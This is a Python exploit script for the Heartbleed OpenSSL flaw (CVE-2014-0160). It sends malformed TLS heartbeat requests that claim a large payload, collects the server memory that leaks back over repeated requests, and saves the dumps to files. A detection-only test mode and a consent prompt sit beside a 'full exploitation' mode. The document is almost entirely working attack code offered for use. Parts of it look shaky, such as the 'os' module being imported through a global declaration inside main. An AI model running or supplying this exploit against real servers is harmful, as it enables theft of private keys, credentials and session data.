#!/usr/bin/env python3
"""
heartbleed_exploit.py - Heartbleed (CVE-2014-0160) vulnerability exploit tool

This script tests for and exploits the Heartbleed vulnerability in vulnerable OpenSSL servers.
For educational and authorized security testing purposes only.
"""

import sys
import socket
import struct
import argparse
import time
import binascii
import random
import select
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# TLS Record Types
TLS_RECORD_HEARTBEAT = 0x18

# TLS HeartBeat message types
HEARTBEAT_REQUEST = 0x01
HEARTBEAT_RESPONSE = 0x02

class HeartbleedExploit:
    def __init__(self, target, port=443, test_mode=False, verbose=False):
        self.target = target
        self.port = port
        self.test_mode = test_mode
        self.verbose = verbose
        self.memory_dump = []
        
    def create_hello_message(self):
        """Create a TLS Client Hello message"""
        # TLS version
        tls_version = b'\x03\x02'  # TLS 1.1
        
        # Client random (32 bytes)
        client_random = struct.pack('!I', int(time.time())) + os.urandom(28)
        
        # Session ID (empty)
        session_id = b'\x00'
        
        # Cipher suites
        cipher_suites = b'\x00\x2f\x00\x35\x00\x05\x00\x0a\x00\x2f\x00\x04'  # Some common cipher suites
        cipher_suites_len = struct.pack('!H', len(cipher_suites))
        
        # Compression methods
        compression_methods = b'\x01\x00'  # No compression
        
        # Extensions - include heartbeat extension
        extensions = b'\x00\x0f\x00\x01\x01'  # Heartbeat extension
        extensions_len = struct.pack('!H', len(extensions))
        
        # Build Client Hello
        client_hello = (
            tls_version + 
            client_random + 
            session_id + 
            cipher_suites_len + 
            cipher_suites + 
            compression_methods + 
            extensions_len + 
            extensions
        )
        
        # Client Hello message type (1) and length
        msg = b'\x01' + struct.pack('!I', len(client_hello))[1:] + client_hello
        
        # TLS Record Layer - Content Type: Handshake (22), Version: TLS 1.0, Length
        record = b'\x16\x03\x01' + struct.pack('!H', len(msg)) + msg
        
        return record
    
    def create_heartbeat_request(self, payload_length=0x4000):
        """Create a TLS Heartbeat request message with a large payload_length"""
        if self.test_mode:
            # In test mode, use a much smaller payload to avoid potential harm
            payload_length = 0x10
            
        # Heartbeat message type: Request
        heartbeat_type = HEARTBEAT_REQUEST
        
        # Heartbeat payload length (artificially large to trigger vulnerability)
        payload_len = struct.pack('!H', payload_length)
        
        # Actual payload (much smaller than what we claim)
        payload = b'A' * 16
        
        # Padding (optional)
        padding = b''
        
        # Build heartbeat message
        heartbeat_msg = bytes([heartbeat_type]) + payload_len + payload + padding
        
        # TLS Record Layer - Content Type: Heartbeat, Version: TLS 1.1, Length
        record = bytes([TLS_RECORD_HEARTBEAT]) + b'\x03\x02' + struct.pack('!H', len(heartbeat_msg)) + heartbeat_msg
        
        return record
    
    def parse_response(self, data):
        """Parse the server response to extract leaked memory"""
        if not data or len(data) <= 5:
            return None
            
        # Check if it's a heartbeat response
        if data[0] == TLS_RECORD_HEARTBEAT:
            # Extract record length
            record_len = struct.unpack('!H', data[3:5])[0]
            
            # If response is larger than expected, we've found a vulnerable server
            if record_len > 3 and record_len > len(data) - 5:
                return data[5:]
            
            # If response is normal size, check if it's a heartbeat response
            if len(data) > 5 and data[5] == HEARTBEAT_RESPONSE:
                if len(data) > 8:  # We have some payload
                    payload_len = struct.unpack('!H', data[6:8])[0]
                    if payload_len + 8 < len(data):  # We got more data than expected
                        return data[8:8+payload_len]
        
        return None
    
    def detect_vulnerability(self):
        """Detect if the target is vulnerable to Heartbleed"""
        logger.info(f"Testing {self.target}:{self.port} for Heartbleed vulnerability...")
        
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, self.port))
            
            # Send Client Hello with heartbeat extension
            hello_msg = self.create_hello_message()
            sock.send(hello_msg)
            
            # Receive Server Hello
            sock.recv(4096)
            
            # Wait a bit for the handshake to complete
            time.sleep(1)
            
            # Send heartbeat request with large payload length
            heartbeat_req = self.create_heartbeat_request()
            sock.send(heartbeat_req)
            
            # Receive response
            ready = select.select([sock], [], [], 5)
            if ready[0]:
                data = sock.recv(65536)
                
                # Check if vulnerable
                leaked_data = self.parse_response(data)
                if leaked_data and len(leaked_data) > 20:  # Got more data than we sent
                    logger.warning(f"[VULNERABLE] {self.target}:{self.port} is vulnerable to Heartbleed!")
                    self.memory_dump.append(leaked_data)
                    sock.close()
                    return True
                else:
                    logger.info(f"[SECURE] {self.target}:{self.port} does not appear to be vulnerable to Heartbleed")
            else:
                logger.info(f"[UNKNOWN] No response received from {self.target}:{self.port}")
            
            sock.close()
            return False
            
        except socket.error as e:
            logger.error(f"Socket error: {e}")
            return False
        except Exception as e:
            logger.error(f"Error testing for Heartbleed: {e}")
            return False
    
    def exploit(self):
        """Exploit the Heartbleed vulnerability to extract memory from the target"""
        if self.test_mode:
            logger.info("[TEST MODE] Would perform Heartbleed exploit on target")
            
            # In test mode, just detect the vulnerability
            is_vulnerable = self.detect_vulnerability()
            
            if is_vulnerable:
                logger.warning("[TEST MODE] Target is vulnerable to Heartbleed")
                return True
            else:
                logger.info("[TEST MODE] Target does not appear vulnerable to Heartbleed")
                return False
        
        # Real exploitation mode
        logger.warning("[EXPLOIT] Starting Heartbleed exploitation...")
        logger.warning("[CAUTION] This will attempt to extract sensitive data from target")
        
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, self.port))
            
            # Send Client Hello with heartbeat extension
            hello_msg = self.create_hello_message()
            sock.send(hello_msg)
            
            # Receive Server Hello
            sock.recv(4096)
            
            # Wait a bit for the handshake to complete
            time.sleep(1)
            
            # Number of heartbeat requests to send
            num_requests = 10
            
            for i in range(num_requests):
                logger.info(f"[EXPLOIT] Sending heartbeat request {i+1}/{num_requests}")
                
                # Send heartbeat request with large payload length
                heartbeat_req = self.create_heartbeat_request()
                sock.send(heartbeat_req)
                
                # Receive response
                ready = select.select([sock], [], [], 5)
                if ready[0]:
                    data = sock.recv(65536)
                    
                    # Extract leaked memory
                    leaked_data = self.parse_response(data)
                    if leaked_data:
                        self.memory_dump.append(leaked_data)
                        
                        if self.verbose:
                            logger.info(f"[EXPLOIT] Received {len(leaked_data)} bytes of leaked memory")
                            
                            # Show a hexdump preview
                            hex_preview = binascii.hexlify(leaked_data[:64]).decode()
                            logger.info(f"[EXPLOIT] Preview: {hex_preview}...")
                
                # Small pause between requests
                time.sleep(0.5)
            
            sock.close()
            
            # Save results
            if self.memory_dump:
                self.save_results()
                logger.info(f"[SUCCESS] Extracted {len(self.memory_dump)} memory dumps from target")
                return True
            else:
                logger.warning("[FAIL] No memory could be extracted from target")
                return False
                
        except socket.error as e:
            logger.error(f"Socket error during exploit: {e}")
            return False
        except Exception as e:
            logger.error(f"Error during exploit: {e}")
            return False
    
    def save_results(self):
        """Save the extracted memory to a file"""
        if not self.memory_dump:
            return
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"heartbleed_{self.target}_{timestamp}.bin"
        
        try:
            with open(filename, 'wb') as f:
                for chunk in self.memory_dump:
                    f.write(chunk)
            
            logger.info(f"[SUCCESS] Saved extracted memory to {filename}")
            
            # Also save a text representation with printable characters
            txt_filename = f"heartbleed_{self.target}_{timestamp}.txt"
            with open(txt_filename, 'w') as f:
                for i, chunk in enumerate(self.memory_dump):
                    f.write(f"=== Memory Chunk {i+1} ===\n")
                    
                    # Convert binary to printable text
                    printable = ''
                    for byte in chunk:
                        if 32 <= byte <= 126:  # Printable ASCII
                            printable += chr(byte)
                        else:
                            printable += '.'
                    
                    f.write(printable + '\n\n')
            
            logger.info(f"[SUCCESS] Saved text representation to {txt_filename}")
            
        except Exception as e:
            logger.error(f"Error saving results: {e}")

def main():
    parser = argparse.ArgumentParser(description='Heartbleed (CVE-2014-0160) vulnerability exploit tool')
    parser.add_argument('target', help='Target host to test')
    parser.add_argument('-p', '--port', type=int, default=443, help='Target port (default: 443)')
    parser.add_argument('--test', action='store_true', help='Run in test mode (detection only)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    args = parser.parse_args()
    
    print("\n" + "="*60)
    print(" HEARTBLEED VULNERABILITY EXPLOIT TOOL")
    print(" CVE-2014-0160")
    print("="*60)
    print(f" Target: {args.target}:{args.port}")
    print(f" Mode: {'Test/Detection Only' if args.test else 'Full Exploitation'}")
    print("="*60 + "\n")
    
    # Warning in full exploitation mode
    if not args.test:
        print("WARNING: You are running in FULL EXPLOITATION mode.")
        print("This will attempt to extract sensitive memory from the target system.")
        print("Ensure you have proper authorization before continuing.\n")
        
        confirm = input("Do you want to continue? (y/n): ").strip().lower()
        if confirm != 'y':
            print("Operation cancelled.")
            sys.exit(0)
    
    # Import os module for os.urandom
    global os
    import os
    
    # Create and run exploit
    exploit = HeartbleedExploit(
        target=args.target,
        port=args.port,
        test_mode=args.test,
        verbose=args.verbose
    )
    
    success = exploit.exploit()
    
    if success:
        print("\n[COMPLETE] Heartbleed operation completed successfully")
        sys.exit(0)
    else:
        print("\n[FAILED] Heartbleed operation failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
